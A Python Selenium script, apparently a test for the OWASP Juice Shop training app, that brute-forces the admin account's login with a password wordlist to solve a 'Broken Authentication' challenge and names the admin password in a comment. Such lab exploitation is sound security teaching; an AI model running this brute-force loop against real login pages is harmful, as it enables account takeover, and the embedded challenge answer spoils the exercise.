# This file will allow us to exploit the login functionality of the OWASP Juice Shop
# using brute force to log into the admin account.

# Completes the achievement "Broken Authentication - Password Strength"

# Import libraries
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
import os
import time

#username: 
#password: admin123
WORDLIST_PATH = os.path.join(os.path.dirname(__file__), "passwords.txt")

def test_ba(driver, base_url, sleep):
    try:
        driver.get(f"{base_url}/#/login")
        time.sleep(sleep)
        
        # Set up the exploit:
        email_field = driver.find_element(By.ID, "email")
        admin_email = "admin@juice-sh.op"
        email_field.clear()
        email_field.send_keys(admin_email)

        passwords = []
        with open(WORDLIST_PATH, "r") as file:
            for line in file:
                passwords.append(line.strip())

        hide_btn = driver.find_element(By.CSS_SELECTOR, "button[aria-label='Button to display the password']")
        hide_btn.click()

        password_field = driver.find_element(By.ID, "password")
        for password in passwords:
            password_field.clear()
            password_field.send_keys(password)
            time.sleep(sleep)
            login = driver.find_element(By.ID, "loginButton")
            login.click()

            # Wait and see if the exploit worked (a redirect to dashboard)
            wait = WebDriverWait(driver, 5)
            try:
                wait.until(EC.url_contains("/#/search"))
                time.sleep(sleep)
                return True
            except:
                pass
        return False
            
    except Exception as e:
        print(f"An exception occured: {e}")
        return False